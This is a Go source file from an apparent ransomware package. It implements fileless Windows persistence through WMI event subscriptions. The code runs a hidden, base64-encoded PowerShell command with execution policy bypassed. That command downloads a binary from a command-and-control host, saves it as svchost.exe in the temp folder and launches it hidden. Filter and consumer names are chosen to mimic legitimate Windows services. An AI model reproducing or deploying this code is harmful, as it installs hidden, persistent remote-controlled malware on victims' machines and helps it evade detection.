package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// WMIPersistence installs fileless persistence via WMI Event Subscriptions.
// Uses __EventFilter (trigger on startup) + CommandLineEventConsumer (exec).
// No files touched on disk -- pure WMI repository.
type WMIPersistence struct {
	config *RansomwareConfig
}

func NewWMIPersistence(cfg *RansomwareConfig) *WMIPersistence {
	return &WMIPersistence{config: cfg}
}

func (wp *WMIPersistence) Install(c2Addr string) error {
	filterName := randomFilterName()
	consumerName := randomConsumerName()
	payload := wp.generatePayload(c2Addr)

	filterQuery := `SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'`
	installScript := fmt.Sprintf(`
$f = ([wmiclass]'root\subscription:__EventFilter').CreateInstance()
$f.Name = '%s'
$f.EventNameSpace = 'root\cimv2'
$f.QueryLanguage = 'WQL'
$f.Query = '%s'
$f.Put() | Out-Null
$c = ([wmiclass]'root\subscription:CommandLineEventConsumer').CreateInstance()
$c.Name = '%s'
$c.CommandLineTemplate = '%s'
$c.Put() | Out-Null
$b = ([wmiclass]'root\subscription:__FilterToConsumerBinding').CreateInstance()
$b.Filter = $f
$b.Consumer = $c
$b.Put() | Out-Null
`, filterName, filterQuery, consumerName, payload)

	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass",
		"-EncodedCommand", pwshB64(installScript),
	)
	return cmd.Run()
}

func (wp *WMIPersistence) Remove() error {
	cleanScript := `
Get-WmiObject -Namespace 'root\subscription' -Class __EventFilter | Where-Object { $_.Name -like '*x404x*' -or $_.Name -like '*WinVerif*' -or $_.Name -like '*SysPerfMon*' -or $_.Name -like '*AudioSrvMon*' } | Remove-WmiObject
Get-WmiObject -Namespace 'root\subscription' -Class CommandLineEventConsumer | Where-Object { $_.Name -like '*x404x*' -or $_.Name -like '*WinVerif*' -or $_.Name -like '*SysPerfMon*' -or $_.Name -like '*AudioSrvMon*' } | Remove-WmiObject
Get-WmiObject -Namespace 'root\subscription' -Class __FilterToConsumerBinding | ForEach-Object { Remove-WmiObject -InputObject $_ }
`
	cmd := exec.Command("powershell",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", cleanScript,
	)
	return cmd.Run()
}

func (wp *WMIPersistence) generatePayload(c2Addr string) string {
	host := strings.Split(c2Addr, ":")[0]
	return fmt.Sprintf(
		`powershell -NoP -NonI -W Hidden -Enc %s`,
		base64Shellcode(fmt.Sprintf(
			`$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$c.DownloadFile('http://%s:8443/agent/windows',$env:TEMP+'\svchost.exe');Start-Process $env:TEMP+'\svchost.exe' -WindowStyle Hidden`,
			host,
		)),
	)
}

func randomFilterName() string {
	names := []string{
		"WinVerif_%04x",
		"SysPerfMon_%04x",
		"NetDiagCheck_%04x",
		"AudioSrvMon_%04x",
		"WinNetDiag_%04x",
	}
	return fmt.Sprintf(names[os.Getpid()%len(names)], os.Getpid()%0xFFFF)
}

func randomConsumerName() string {
	names := []string{
		"WinVerifConsumer_%04x",
		"SysPerfMonTask_%04x",
		"NetDiagRunner_%04x",
		"AudioSrvTask_%04x",
		"WinNetDiagRunner_%04x",
	}
	return fmt.Sprintf(names[os.Getpid()%len(names)], os.Getpid()%0xFFFF)
}
